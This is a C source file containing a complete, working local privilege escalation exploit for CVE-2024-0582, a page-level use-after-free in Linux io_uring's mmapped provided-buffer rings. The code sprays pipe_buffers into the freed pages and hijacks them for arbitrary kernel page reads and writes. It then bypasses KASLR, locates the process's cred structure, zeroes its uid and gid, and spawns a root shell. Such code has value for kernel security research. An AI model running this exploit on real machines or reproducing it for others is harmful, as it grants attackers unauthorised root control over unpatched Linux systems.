/**
 * Copyright (c) 2025 arttnba3 <arttnba@gmail.com>
 * 
 * This work is licensed under the terms of the GNU GPL, version 2 or later.
**/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdarg.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sched.h>
#include <liburing.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <sys/prctl.h>

#ifndef IS_ERR
#define IS_ERR(ptr) ((uintptr_t) ptr >= (uintptr_t) -4095UL)
#endif

#ifndef PTR_ERR
#define PTR_ERR(ptr) ((int) (intptr_t) ptr)
#endif

#define SUCCESS_MSG(msg) "\033[32m\033[1m" msg "\033[0m"
#define INFO_MSG(msg) "\033[34m\033[1m" msg "\033[0m"
#define ERR_MSG(msg) "\033[31m\033[1m" msg "\033[0m"

#define KASLR_GRANULARITY 0x10000000
#define KASLR_MASK (~(KASLR_GRANULARITY - 1))
uint64_t kernel_base, vmemmap_base, page_offset_base;

static inline void inst_for_gdb_breakpoint(void) {
    static int cnt = 1;
    static int sid = -1;
    printf("getsid #%d\n", cnt);
    sid = getsid(getpid());
    printf("getsid #%d = %d\n", cnt, sid);
    cnt ++;
}

void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf(INFO_MSG("[*] Process binded to core: ") "%d\n", core);
}

void err_exit(const char *fmt, ...)
{
    va_list args;
    int ret;

    va_start(args, fmt);
    printf(fmt, args);
    va_end(args);

    fflush(stdout);
    fflush(stderr);

    sleep(5);

    exit(EXIT_FAILURE);
}

void get_root_shell(void)
{
    if(getuid()) {
        puts(ERR_MSG("[x] Failed to get the root!"));
        sleep(5);
        exit(EXIT_FAILURE);
    }

    puts(SUCCESS_MSG("[+] Successful to get the root."));
    puts(INFO_MSG("[*] Execve root shell now..."));

    system("/bin/sh");
    
    /* to exit the process normally, instead of potential segmentation fault */
    exit(EXIT_SUCCESS);
}

struct io_uring_buf_ring*
setup_pbuf_ring_mmap(struct io_uring *ring, unsigned int ring_entries,
                     int bgid, unsigned int flags, int *retp)
{
    struct io_uring_buf_ring *buf_ring;
    struct io_uring_buf_reg buf_reg;
    size_t ring_size;
    off_t offset;
    int ret;

    memset(&buf_reg, 0, sizeof(buf_reg));

    /* we don't need to set reg.addr for IOU_PBUF_RING_MMAP */
    buf_reg.ring_entries = ring_entries;
    buf_reg.bgid = bgid;
    buf_reg.flags = IOU_PBUF_RING_MMAP;

    ret = io_uring_register_buf_ring(ring, &buf_reg, flags);
    if (ret) {
        puts(ERR_MSG("[x] Error occur while doing io_uring_register_buf_ring"));
        *retp = ret;
        return NULL;
    }

    /**
 [chr(int(i,16))for i in['3361626e74747261'[i:i+2]for i in range(0,16,2)]][::-1]
    **/
    offset = IORING_OFF_PBUF_RING | (uint64_t) bgid << IORING_OFF_PBUF_SHIFT;
    ring_size = ring_entries * sizeof(struct io_uring_buf);
    buf_ring = mmap(
        NULL,
        ring_size,
        PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
        ring->ring_fd,
        offset
    );

    if (IS_ERR(buf_ring)) {
        puts(ERR_MSG("[x] Error occur while doing mmap() for io_uring"));
        *retp = PTR_ERR(buf_ring);
        return NULL;
    }

    *retp = 0;
    return buf_ring;
}

/**
 * In my test environment, kmalloc-1k allocates from 4-page slub, so I chose 4.
 * However, it might not be the same in your environment, e.g., it's 8 on my PC.
 * Check your /proc/slabinfo before doing the exploitation.
*/
#define NR_PAGES    1
#define NR_BUFFERS  64 // 0x200
#define SEQ_FILE_NR 64 // 0x200
#define PIPE_SPRAY_NR 64 // 0x1F0

struct pipe_buffer {
    struct page *page;
    unsigned int offset, len;
    const struct pipe_buf_operations *ops;
    unsigned int flags;
    unsigned long private;
};

struct cred {
    long usage;
    uint32_t uid;
    uint32_t gid;
    uint32_t suid;
    uint32_t sgid;
    uint32_t euid;
    uint32_t egid;
    uint32_t fsuid;
    uint32_t fsgid;
};

void read_kernel_page_by_pipe(struct page*page,struct pipe_buffer*kern_pipe_buf,
                              int pipe_fd[2], void *buf, size_t len)
{
    kern_pipe_buf->page = page;
    kern_pipe_buf->offset = 0;
    kern_pipe_buf->len = 0xffe;

    if (read(pipe_fd[0], buf, len) != len) {
        perror(ERR_MSG("[x] Unable to do reading on pipe"));
        exit(EXIT_FAILURE);
    }
}

void write_kernel_page_by_pipe(struct page *page,
                               struct pipe_buffer*kern_pipe_buf,
                               int pipe_fd[2], void *buf, size_t len)
{
    kern_pipe_buf->page = page;
    kern_pipe_buf->offset = 0;
    kern_pipe_buf->len = 0;

    if (write(pipe_fd[1], buf, len) != len) {
        perror(ERR_MSG("[x] Unable to do writing on pipe"));
        exit(EXIT_FAILURE);
    }
}

void exploit(void)
{
    struct io_uring ring;
    void **buffers;
    struct pipe_buffer *kern_pipe_buffer = NULL;
    uint64_t kernel_leak;
    int pipe_fd[PIPE_SPRAY_NR][2], victim_idx = -1;
    uint32_t uid, gid;
    uint64_t cred_kaddr, cred_kpage_addr;
    struct cred *cred_data;
    char buf[0x1000];
    int ret;

    puts(SUCCESS_MSG("-------- CVE-2024-0582 Exploitation --------") "\n"
    INFO_MSG("--------      Author: ")"arttnba3"INFO_MSG("      --------") "\n"
    SUCCESS_MSG("-------- Local Privilege Escalation --------\n"));

    bind_core(0);

    puts("[*] Initializing io_uring ...");

    if (io_uring_queue_init(4, &ring, 0) < 0) {
        perror(ERR_MSG("[x] Unable to init for io_uring queue"));
        exit(EXIT_FAILURE);
    }

    puts("[*] Initialized");
    inst_for_gdb_breakpoint();
    puts("[*] Allocating pbuf ring and doing mmap() ...");

    buffers = calloc(NR_BUFFERS, sizeof(void*));
    for (int i = 0; i < NR_BUFFERS; i++) {
        buffers[i] = setup_pbuf_ring_mmap(
            &ring,
            NR_PAGES * PAGE_SIZE / sizeof(struct io_uring_buf),
            i,
            0,
            &ret
        );
        if (ret) {
            printf(
                ERR_MSG("[x] Unable to set up") " No.%d "
                ERR_MSG("pbuf ring, error code: ") "%d\n",
                i,
                ret
            );
            exit(EXIT_FAILURE);
        }

        io_uring_buf_ring_init(buffers[i]);
    }
    for (int i = 0; i < NR_BUFFERS; i++) {
        // Write some data to activate refcount of struct page for debugging
        memset(buffers[i], 0x41 + (i % 26), NR_PAGES * PAGE_SIZE);
    }

    puts("[*] Allocated");
    inst_for_gdb_breakpoint();
    puts("[*] Triggering page-level UAF vulnerabilities ...");

    for (int i = 0; i < NR_BUFFERS; i += 2) {   /* we neeed "holes" */
        ret = io_uring_unregister_buf_ring(&ring, i);
        if (ret) {
            printf(
                ERR_MSG("[x] Unable to unregister") " No.%d "
                ERR_MSG("pbuf ring, error code: ") "%d\n",
                i,
                ret
            );
            exit(EXIT_FAILURE);
        }
    }

    inst_for_gdb_breakpoint();
    puts("[*] Reallocating pages as pipe_buffers ...");

    for (int i = 0; i < PIPE_SPRAY_NR; i++) {
        if ((ret = pipe(pipe_fd[i])) < 0) {
            printf(
                ERR_MSG("[x] Unable to set up") " No.%d "
                ERR_MSG("pipe, error code: ") "%d\n",
                i,
                ret
            );
            exit(EXIT_FAILURE);
        }
    }

    inst_for_gdb_breakpoint();
    puts("[*] Allocating pipe_buffer::page ...");

    for (int i = 0; i < PIPE_SPRAY_NR; i++) {
        write(pipe_fd[i][1], "arttnba3", 8);
        write(pipe_fd[i][1], "arttnba3", 8);
        write(pipe_fd[i][1], "arttnba3", 8);
        write(pipe_fd[i][1], "arttnba3", 8);
    }

    inst_for_gdb_breakpoint();
    puts("[*] Checking for UAF mmap address ...");

    for (int i = 0; i < NR_BUFFERS; i += 2) {
        uint64_t *buffer = buffers[i];
        for (int j = 0; j < (NR_PAGES * PAGE_SIZE / sizeof(uint64_t)); j++) {
            if (buffer[j] > 0xffff000000000000
                && buffer[j + 1] == 0x2000000000
                && buffer[j + 2] > 0xffffffff81000000) {
                printf(
                    SUCCESS_MSG("[+] Got kernel pipe_buffer mapped at buffer:")
                    " %d-%d\n", i, j
                );
                printf(
                    INFO_MSG("[*] Leak pipe_buffer::page = ")"%lx\n", buffer[j]
                );
                printf(
                    INFO_MSG("[*] Leak pipe_buffer::ops = ")"%lx\n", buffer[j+2]
                );
                kern_pipe_buffer = (void*) &buffer[j];
                goto out_find_pipe;
            }
        }
    }

    if (!kern_pipe_buffer) {
        puts(ERR_MSG("[x] Failed to find kernel pipe_buffer in user space!"));
        exit(EXIT_FAILURE);
    }

out_find_pipe:

    inst_for_gdb_breakpoint();
    puts("[*] Overwriting victim pipe_buffer::page ...");
    /* note that the granularity of KASLR is 256MB, i.e. 0x10000000*/
    vmemmap_base = (uint64_t) kern_pipe_buffer->page & KASLR_MASK;
    kern_pipe_buffer->page = (void*) (vmemmap_base + 0x9d000 / 0x1000 * 0x40);

    for (int i = 0; i < PIPE_SPRAY_NR; i++) {
        read(pipe_fd[i][0], &kernel_leak, sizeof(kernel_leak));
        if (kernel_leak != *(uint64_t*) "arttnba3") {
            printf(SUCCESS_MSG("[+] Got victim pipe at idx: ") "%d\n", i);
            victim_idx = i;
            break;
        }
    }

    if (victim_idx == -1) {
        puts(ERR_MSG("[x] Failed to find the victim pipe!"));
        exit(EXIT_FAILURE);
    }

    for (uint64_t loop_nr = 0; 1; loop_nr++) {
        if (kernel_leak > 0xffffffff81000000
            && (kernel_leak & 0xfff) < 0x100) {
            kernel_base = kernel_leak & 0xfffffffffffff000;
            if (loop_nr != 0) {
                puts("");
            }
            printf(
                INFO_MSG("[*] Leak secondary_startup_64 : ") "%lx\n",kernel_leak
            );
            printf(SUCCESS_MSG("[+] Got kernel base: ") "%lx\n", kernel_base);
            printf(SUCCESS_MSG("[+] Got vmemmap_base: ") "%lx\n", vmemmap_base);
            break;
        }

        for (int i = 0; i < 80; i++) {
            putchar('\b');
        }
        printf(
            "[No.%ld loop] Got unmatched data: %lx, keep looping...",
            loop_nr,
            kernel_leak
        );

        vmemmap_base -= KASLR_GRANULARITY;
        read_kernel_page_by_pipe(
            (void*) (vmemmap_base + 0x9d000 / 0x1000 * 0x40),
            kern_pipe_buffer,
            pipe_fd[victim_idx],
            &kernel_leak,
            sizeof(kernel_leak)
        );
    }

    inst_for_gdb_breakpoint();
    puts("[*] Finding task_struct of current process in kernel space ...");

    prctl(PR_SET_NAME, "rat3bant");
    uid = getuid();
    gid = getgid();

    for (int i = 0; 1; i++) {
        uint64_t *comm_addr;

        read_kernel_page_by_pipe(
            (void*) (vmemmap_base + 0x40 * i),
            kern_pipe_buffer,
            pipe_fd[victim_idx],
            buf,
            0xff8
        );

        comm_addr = memmem(buf, 0xff0, "rat3bant", 8);

        if (comm_addr && (comm_addr[-2] > 0xffff888000000000) /* task->cred */
            && (comm_addr[-3] > 0xffff888000000000) /* task->real_cred */
            && (comm_addr[-2] == comm_addr[-3])) {  /* should be equal */

            printf(
                SUCCESS_MSG("[+] Found task_struct on page: ") "%lx\n",
                (vmemmap_base + i * 0x40)
            );
            printf(SUCCESS_MSG("[+] Got cred address: ") "%lx\n",comm_addr[-2]);

            cred_kaddr = comm_addr[-2];
            cred_data = (void*) (buf + (cred_kaddr & (PAGE_SIZE - 1)));
            page_offset_base = cred_kaddr & KASLR_MASK;

            while (1) {
                cred_kpage_addr = vmemmap_base + \
                                (cred_kaddr - page_offset_base) / 0x1000 * 0x40;
            
                read_kernel_page_by_pipe(
                    (void*) cred_kpage_addr,
                    kern_pipe_buffer,
                    pipe_fd[victim_idx],
                    buf,
                    0xffe
                );
                if (cred_data->uid == uid
                    && cred_data->gid == gid) {
                    printf(
                        SUCCESS_MSG("[+] Found cred on page: ") "%lx\n",
                        cred_kpage_addr
                    );
                    break;
                }

                page_offset_base -= KASLR_GRANULARITY;
            }

            break;
        }
    }

    inst_for_gdb_breakpoint();
    puts("[*] Overwriting cred and granting root privilege...");

    cred_data->uid = 0;
    cred_data->gid = 0;

    write_kernel_page_by_pipe(
        (void*) cred_kpage_addr,
        kern_pipe_buffer,
        pipe_fd[victim_idx],
        buf,
        0xff0
    );

    setresuid(0, 0, 0);
    setresgid(0, 0, 0);

    inst_for_gdb_breakpoint();
    get_root_shell();

    puts("[*] Done.");
    inst_for_gdb_breakpoint();
}

int main(int argc, char **argv, char **envp)
{
    exploit();
    return 0;
}
